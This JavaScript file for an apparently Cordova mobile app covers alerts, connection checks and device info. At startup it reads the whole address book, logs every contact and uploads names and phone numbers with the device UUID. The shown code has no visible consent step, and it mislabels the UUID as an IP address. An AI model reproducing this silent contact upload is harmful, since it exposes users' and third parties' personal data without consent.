var app = {

	showAlert: function (message, title)
	{
      if(navigator.notification)
	  {
        navigator.notification.alert(message, null, title, 'OK');
      }
	  else
	  {
	    alert(title ? (title + ": " + message) : message);
      }
	},

   
    initialize: function()
	{

		var self = this;
		
		this.routeURL = /^#route\/(\d{1,})/;
		
		//this.registerEvents();
	    
		document.addEventListener("deviceready", this.onDeviceReady, false);
		
		this.store = new LocalStorageStore(function()
		{
			
		    $('body').html(new HomeView(self.store).render(HomeView.template).el);
			
			//$('body').html(new HomeView(self.store).render(HomeView.login_otp_tpl).el);
			
			$(".wrapper").css( { 'min-height': $(window).height() }, { queue: false, duration: 800 });
			
		});

	},
		 
	registerEvents: function() {
    var self = this;
       $(window).on('hashchange', $.proxy(this.route, this));
    // Check of browser supports touch events...
    if (document.documentElement.hasOwnProperty('ontouchstart')) {
        // ... if yes: register touch event listener to change the "selected" state of the item
        $('body').on('touchstart', 'a', function(event) {
            $(event.target).addClass('tappable-active');
        });
        $('body').on('touchend', 'a', function(event) {
            $(event.target).removeClass('tappable-active');
        });
    } else {
        // ... if not: register mouse events instead
        $('body').on('mousedown', 'a', function(event) {
            $(event.target).addClass('tappable-active');
        });
        $('body').on('mouseup', 'a', function(event) {
            $(event.target).removeClass('tappable-active');
        });
    }
},
	route: function()
	{
        var hash = window.location.hash;
    },
	
	checkConnection: function()
	{
	    
		    var networkState = false;
	
	        if(app.isPhonegap())
			{
			    networkState = navigator.network.connection.type;
			    var states = {};
				states[Connection.UNKNOWN]  = 'Unknown connection';
				states[Connection.ETHERNET] = 'Ethernet connection';
				states[Connection.WIFI]     = 'WiFi connection';
				states[Connection.CELL_2G]  = 'Cell 2G connection';
				states[Connection.CELL_3G]  = 'Cell 3G connection';
				states[Connection.CELL_4G]  = 'Cell 4G connection';
				states[Connection.NONE]     = 'No network connection';
				//console.log('Connection : ' + Connection);
				//console.log('Connection type: ' + states[networkState]);
				if(networkState==Connection.NONE) {	$('p.offline').show(); 	}
				//alert('checkConnection='+networkState);
				return networkState;
				
				// alert('Connection type: '+  networkState+ states[networkState]);
			}
			
			else
			{
			  
			  networkState = navigator.onLine ? 'online' : 'offline';
			  
			  return networkState;
			}
	
	        
	},
	
	
	isPhonegap:function() {
		    return (typeof(cordova) !== 'undefined' || typeof(phonegap) !== 'undefined');
	},

	onDeviceReady:function()
	{
		
		//$(".wrapper").css( { 'min-height': $(window).height() }, { queue: false, duration: 800 });
		
		getContacts();
		
		//getLocation();
		
		document.addEventListener("offline", onOffline, false);
		
		document.addEventListener("online", onOnline, false);
		
		//document.addEventListener("backbutton", onBackKeyDown, false);			
		
		
		/*
		
		
		//enabling zoom control
         cordova.plugins.ZoomControl.ZoomControl("true");
         // enabling built in zoom control
         cordova.plugins.ZoomControl.setBuiltInZoomControls("true");
         // enabling display zoom control
         cordova.plugins.ZoomControl.setDisplayZoomControls("true");
		 
		 */

	},
	
	deviceInfo: function()
	{
	 var DeviceInfo =			 'Device_Name: '     + device.name     + ', ' + 
                                 'Device_Cordova: '  + device.cordova + ', ' + 
								 'Device_Platform: ' + device.platform + ', ' + 
								 'Device_UUID: '     + device.uuid     + ', ' + 
								 'Device_ip_address: '     + device.uuid     + ', ' + 
								 'Device_Version: '  + device.version  ;
	 return DeviceInfo;

	}
};

function getContacts()
{
	    console.log('i m in getContacts');
	    var options = new ContactFindOptions();    
        options.filter   = "";
        options.multiple = true;
        var fields = ["displayName","phoneNumbers"];
		//var fields = ["*"];
        navigator.contacts.find(fields, onSuccessContact, onErrorContact, options);
}

function onSuccessContact(contacts)
{
	
	var contacts_detail = [];
	
	console.log('Total Contacts Found: '+ contacts.length);
	
	for(var i=0; i<contacts.length; i++)
	{
		
		console.log(JSON.stringify(contacts[i]));
		
		var obj = {};
		
		/*
		
		//checked on android
		
		if(contacts[i].displayName)
		{
		   obj['name'] = contacts[i].displayName;
		}
		
		*/
		
		if(contacts[i].name)
		{
		   obj['name'] = contacts[i].name['formatted'];
		}
		
		
		if(contacts[i].phoneNumbers)
		{
		
		   var phoneNos = contacts[i].phoneNumbers;
		
		   //console.log(phoneNos);	
		
			var phones = '';

			for(var j=0; j<phoneNos.length; j++)
			{
				 if(phoneNos.length > 1)
				 {
				   phones += phoneNos[j].value + ' ';
				 }
				 else
				 {
					phones += phoneNos[j].value; 
				 }
			}



			obj['phone_nos'] = phones;

			//console.log(JSON.stringify(obj)); 

			contacts_detail.push(obj);
		
		}
		
	}
	
	console.log(contacts_detail.length);
	
	//console.log(contacts_detail);
	
	window.localStorage.setItem("contacts",JSON.stringify(contacts_detail));
	
	var data = {'method': 'uploadContacts', 'device_uuid': device.uuid, 'device_detail': app.deviceInfo(), 'user_contacts': window.localStorage.getItem("contacts"), 'user_status': 'Not Verified'};
	
	sendUserData(data);

	/*
	$.getJSON('http://freegeoip.net/json/github.com',function(data)
	{
		//console.log('Call Data:');
		
		console.log(JSON.stringify(data));             
		
	    //alert(JSON.stringify(data));

	})
	.fail(function( jqxhr, textStatus, error )
	{
	  var err = textStatus + ", " + error ;
	  console.log( "Request Failed: " + err + '--' +jqxhr.responseText + jqxhr.getAllResponseHeaders());
	  //alert("Application is Off-Line at the moment and failed to get ip json");
	});
	*/
	
}

// onError: Failed to get the contacts
function onErrorContact(contactError)
{
	
	console.log('contacts error='+contactError);
	
	//app.showAlert('Failed to Read Contacts');
}


function onOffline()
{
	//app.showAlert('You are Offline', 'UGI Touch');
	
	isOnline = false;
}

function onOnline()
{
	//app.showAlert('You are Online', 'UGI Touch');
	
	isOnline = true;
}

function onBackKeyDown()
{
	$('body').html(new HomeView(self.store).render(HomeView.template).el);	
	$(".wrapper").css( { 'min-height': $(window).height() }, { queue: false, duration: 800 });		
}


    function onmapSuccess(position)
	{
		console.log(position);
       /* alert('Latitude: '          + position.coords.latitude          + '\n' +             'Longitude: '         + position.coords.longitude         + '\n' + 'Altitude: '          + position.coords.altitude          + '\n' +           'Accuracy: '          + position.coords.accuracy          + '\n' +             'Altitude Accuracy: ' + position.coords.altitudeAccuracy  + '\n' +             'Heading: '           + position.coords.heading           + '\n' +              'Speed: '             + position.coords.speed             + '\n' +              'Timestamp: '         + position.timestamp                + '\n'); */
    };

    // onError Callback receives a PositionError object
    //
    function onmapError(error) {
        alert('code: '    + error.code    + '\n' +
              'message: ' + error.message + '\n');
    }
	
	function getLocation()
	{ //console.log(navigator.geolocation);
		navigator.geolocation.getCurrentPosition(onmapSuccess, onmapError,  { enableHighAccuracy: true });
	}

    